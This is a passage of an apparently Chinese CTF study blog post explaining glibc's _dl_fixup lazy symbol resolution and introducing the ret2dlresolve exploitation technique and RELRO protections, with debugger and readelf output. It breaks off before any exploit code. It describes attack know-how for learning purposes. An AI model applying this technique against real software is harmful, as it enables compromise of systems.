<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/s l.l_name</span><br><span class="line">$<span class="number">8</span> = <span class="number">0xf7ffdd2c</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_name</span><br><span class="line">$<span class="number">9</span> = <span class="number">0xf7fc828c</span> <span class="string">&quot;linux-gate.so.1&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_name</span><br><span class="line">$<span class="number">10</span> = <span class="number">0xf7fc2390</span> <span class="string">&quot;/home/glibc32/lib/libc.so.6&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_name</span><br><span class="line">$<span class="number">11</span> = <span class="number">0x8046174</span> <span class="string">&quot;/home/glibc32/lib/ld-linux.so.2&quot;</span></span><br><span class="line">pwndbg&gt; p/s l.l_next.l_next.l_next.l_next.l_name</span><br><span class="line">Cannot access memory at address <span class="number">0x4</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>另一个就是reloc_arg,也就是他要解析的函数符号,在.rel.plt节区中的偏移</p>
<p>显然抛开基地址谈偏移量是没有意义的,因此下面要做的第一件事是找到.rel.plt的基地址</p>
<p>怎么找呢?</p>
<p>大体步骤如下伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(<span class="keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1.找到dynamic节,1-&gt;1l_info就是dynamic节,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到.rel.plt节记为reloc</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到符号表symtab,</span></span><br><span class="line">    <span class="comment">//从dynamic节中找到字符串表strtab</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 2.使用reloc_arg配合reloc表找到该表中的具体项目Elf32_Rel</span></span><br><span class="line">    <span class="comment">//        typedef struct&#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr  r_offset;       //符号要填充的got表项的虚拟地址</span></span><br><span class="line">    <span class="comment">//            Elf32_Word  r_info;         //符号在符号表中的下标</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Rel;</span></span><br><span class="line">	<span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 3.找到符号表对应表项</span></span><br><span class="line">    <span class="comment">//        typedef struct &#123;</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_name;	//符号名字符串在字符串表中的偏移</span></span><br><span class="line">    <span class="comment">//            Elf32_Addr	st_value;	//符号在其所在模块中的偏移量</span></span><br><span class="line">    <span class="comment">//            Elf32_Word	st_size;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_info;</span></span><br><span class="line">    <span class="comment">//            unsigned char	st_other;</span></span><br><span class="line">    <span class="comment">//            Elf32_Half	st_shndx;</span></span><br><span class="line">    <span class="comment">//        &#125; Elf32_Sym;</span></span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 4.解析符号</span></span><br><span class="line">    <span class="comment">//从strtab偏移Elf32_Sym.st_name处找到符号名,</span></span><br><span class="line">    <span class="comment">//从链表相接的各个模块的link_map入手,遍历各个模块,寻找该符号名,如果找到,result返回对应模块的link_map</span></span><br><span class="line">    <span class="comment">//同时sym废物利用,从对应模块的符号表中抄了同名的符号过来,但是这个符号是有虚拟地址的</span></span><br><span class="line">	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// result中保存着目标模块的基地址,加上目标符号的偏移量,得到该符号纯纯的虚拟地址,放到value里</span></span><br><span class="line">    <span class="comment">// 这里DL_FIXUP_MAKE_VALUE(map,addr) = addr,纯纯弱智</span></span><br><span class="line">	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5.回写GOT表</span></span><br><span class="line">    <span class="comment">//最后把value写入相应的GOT表条目中,rel_addr就是GOT地址</span></span><br><span class="line">	<span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在图上意思意思</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png"
alt="image-20240819193758449" />
<figcaption aria-hidden="true">image-20240819193758449</figcaption>
</figure>
<p>下面详细说明每一步</p>
<h3 id="由主模块link_map找dynamic节">1.由主模块link_map找dynamic节</h3>
<p>这个<code>link_map</code>中有一个成员叫<code>l_info</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.		dynamic节的索引指针</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">   	...</span><br></pre></td></tr></table></figure>
<p><code>l_info</code>的类型是<code>ElfW(Dyn)**</code>,也就是<code>Elf32_Dyn**</code>，这是一个二级指针，或者说数组指针</p>
<p>意思是在内存某个地方有一个<code>dynamic</code>数组，然后这个指针指向数组的基地址</p>
<p>在运行时<code>l_info</code>指向所在模块的的<code>dynamic</code>节</p>
<p><code>dynamic</code>节加载进入内存的地址是确定的，比如本程序中在<code>0x080497c4</code>,可以使用<code>readelf -S</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -S main_no_relro_32</span></span><br><span class="line">There are <span class="number">30</span> section headers, starting at offset <span class="number">0x10b0</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>在<code>GOT.PLT</code>表的最头部,也保存着一个<code>_DYNAMIC</code>的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GOT.PLT[0] =&gt; _DYNAMIC</span><br><span class="line">GOT.PLT[1] =&gt; link_map</span><br><span class="line">GOT.PLT[2] =&gt; dl_runtime_resolve</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>dynamic节中的内容可以用<code>readelf -d</code>查看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">└─<span class="meta"># readelf -d main_no_relro_32</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0x7c4</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x804832c</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x8048634</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x80497bc</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x80497c0</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x804818c</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804824c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">107</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x80498b8</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">40</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x8048304</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x80482ec</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x80482cc</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x80482b8</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080497C4 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:080497C4                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:080497C4                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:080497CC                 Elf32_Dyn &lt;0Ch, &lt;804832Ch&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:080497D4                 Elf32_Dyn &lt;0Dh, &lt;8048634h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:080497DC                 Elf32_Dyn &lt;19h, &lt;80497BCh&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:080497E4                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:080497EC                 Elf32_Dyn &lt;1Ah, &lt;80497C0h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:080497F4                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:080497FC                 Elf32_Dyn &lt;6FFFFEF5h, &lt;804818Ch&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049804                 Elf32_Dyn &lt;5, &lt;804824Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:0804980C                 Elf32_Dyn &lt;6, &lt;80481ACh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049814                 Elf32_Dyn &lt;0Ah, &lt;6Bh&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:0804981C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049824                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:0804982C                 Elf32_Dyn &lt;3, &lt;80498B8h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049834                 Elf32_Dyn &lt;2, &lt;28h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:0804983C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049844                 Elf32_Dyn &lt;17h, &lt;8048304h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:0804984C                 Elf32_Dyn &lt;11h, &lt;80482ECh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049854                 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:0804985C                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049864                 Elf32_Dyn &lt;6FFFFFFEh, &lt;80482CCh&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:0804986C                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049874                 Elf32_Dyn &lt;6FFFFFF0h, &lt;80482B8h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:0804987C                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype Elf32_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="由dynamic节找其他各节">2.由dynamic节找其他各节</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">strtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);	</span><br><span class="line">pltgot 	= (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);		<span class="comment">//实际上_dl_fixup中没有用到</span></span><br><span class="line">reloc 	= (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure>
<p>这里有四个节,实际上每个节都是表</p>
<table>
<colgroup>
<col style="width: 17%" />
<col style="width: 17%" />
<col style="width: 65%" />
</colgroup>
<thead>
<tr>
<th>表名</th>
<th>元素类型</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>symtab符号表</td>
<td>struct Elf32_Sym</td>
<td>保存符号名在strtab中的偏移,<br />保存符号在模块中的相对地址<br />...</td>
</tr>
<tr>
<td>strtab字符串表</td>
<td>char</td>
<td>保存本模块中所有需要动态链接的符号名</td>
</tr>
<tr>
<td>pltgot过程链接表</td>
<td></td>
<td>实际上<code>_dl_fixup</code>中没有用到</td>
</tr>
<tr>
<td>jmprel重定位表</td>
<td>struct Elf32_Rel</td>
<td>保存符号的虚拟地址,<br />保存符号在符号表中的偏移</td>
</tr>
</tbody>
</table>
<p>symtab符号表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span><span class="comment">//符号名在strtab中的偏移</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>	<span class="comment">//符号在其模块中相对地址</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>jmprel重定位表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<h3
id="在本模块符号表中找到对应表项">3.在本模块符号表中找到对应表项</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));<span class="comment">//在重定位表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];	<span class="comment">//在符号表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;	<span class="comment">//副本</span></span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);	<span class="comment">//GOT表项地址,为后来回填做准备</span></span><br></pre></td></tr></table></figure>
<p>下面到4之前是一些检查,忽略</p>
<h3 id="解析符号">4.解析符号</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>* <span class="title">result</span>;</span></span><br><span class="line"> 	Elf32_Addr value;</span><br><span class="line"></span><br><span class="line">result = _dl_lookup_symbol_x (</span><br><span class="line">         strtab + sym-&gt;st_name, 		<span class="comment">//符号名字符串</span></span><br><span class="line">         l, 							<span class="comment">//本模块的link_map</span></span><br><span class="line">         &amp;sym, 						<span class="comment">//返回值,如果在其他模块找到该符号则返回其符号表项</span></span><br><span class="line">         l-&gt;l_scope,</span><br><span class="line">         version, </span><br><span class="line">         ELF_RTYPE_CLASS_PLT, </span><br><span class="line">         flags, </span><br><span class="line">         <span class="literal">NULL</span></span><br><span class="line">     );<span class="comment">//返回值result是找到符号实现所在模块的link_map</span></span><br><span class="line"></span><br><span class="line">     value = DL_FIXUP_MAKE_VALUE (</span><br><span class="line">         result,</span><br><span class="line">         SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>)<span class="comment">//从link_map *result中提取目标模块基地址,加上sym.st_value偏移量得到符号虚拟地址</span></span><br><span class="line">     );</span><br></pre></td></tr></table></figure>
<h3 id="回填got表项">5.回填GOT表项</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>
<p>这里有一个压行,干了两个事情,</p>
<p>一是调用elf_machine_fixup_plt把value回写到rel_addr上</p>
<p>二是把value值,也就是已经解析出来的符号地址,放到eax寄存器上返回</p>
<p>注意此时是在dl_fixup中返回到dl_runtime_resolve中</p>
<p>下面的指令是这样的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call _dl_fixup		# Call resolver.</span><br><span class="line">popl %edx		# Get <span class="keyword">register</span> content back.</span><br><span class="line">movl (%esp), %ecx</span><br><span class="line">movl %eax, (%esp)	# Store the function address.</span><br><span class="line">movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">ret $<span class="number">12</span>			# Jump to function address.</span><br></pre></td></tr></table></figure>
<p>注意到dl_runtime_resolve返回之前,栈顶是刚刚放入的eax,也就是刚解析出来的符号值</p>
<p>也就是直接 ret2目标函数 了</p>
<h2 id="ret2dl_resolve">ret2dl_resolve</h2>
<p>能不能进行这种利用,得看RELRO✌的脸色</p>
<p>RELRO保护:</p>
<p>read only relocation,只读重定位</p>
<p>鉴于攻击者可以篡改GOT表,填充危险函数,因此如果GOT表是只读的,攻击者就没法写了</p>
<p>RELRO的目的是保护函数指针,防止篡改</p>
<table style="width:100%;">
<colgroup>
<col style="width: 14%" />
<col style="width: 68%" />
<col style="width: 4%" />
<col style="width: 11%" />
</colgroup>
<thead>
<tr>
<th>保护程度</th>
<th>效果</th>
<th></th>
<th>编译选项</th>
</tr>
</thead>
<tbody>
<tr>
<td>NO_RELRO</td>
<td>dynamic段可写<br />GOT表可写,允许延迟绑定</td>
<td></td>
<td>-z norelro</td>
</tr>
<tr>
<td>PARTIAL_RELRO</td>
<td>dynamic段只读,<br />但是GOT表还是可写的,允许延迟绑定</td>
<td></td>
<td>-z lazy</td>
</tr>
<tr>
<td>FULL_RELRO</td>
<td>dynamic段只读<br />GOT表只读,不允许延迟绑定,所有符号必须在加载程序时立刻解析</td>
<td></td>
<td>-z now</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>回顾<code>_dl_fixup</code>函数解析符号的过程</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png"
alt="image-20240819193758449" />
<figcaption aria-hidden="true">image-20240819193758449</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Algorithm _dl_fixup</span><br><span class="line">Input:	a Link_Map linkmap of the Main module, an index reloc_arg of the jmprel table </span><br><span class="line">Output:	virtual address of the target symbol</span><br><span class="line"></span><br><span class="line">dynamic = linkmap.l_info</span><br><span class="line">jmprel = dynamic[DT_JMPREL]</span><br><span class="line">strtab = dynamic[DT_STRTAB]</span><br><span class="line">symtab = dynamic[DT_SYMTAB]</span><br><span class="line"></span><br><span class="line">reloc = jmprel[reloc_arg]</span><br><span class="line">sym = symtab[reloc.r_info]</span><br><span class="line">str = strtab[sym.st_name]</span><br><span class="line"></span><br><span class="line"><span class="comment">//other_linkmap是其他模块的Link_Map结构</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x(str)从其他模块中寻找str符号,如果找到则返回该符号与其所在的link_map</span></span><br><span class="line">[sym,other_linkmap] = 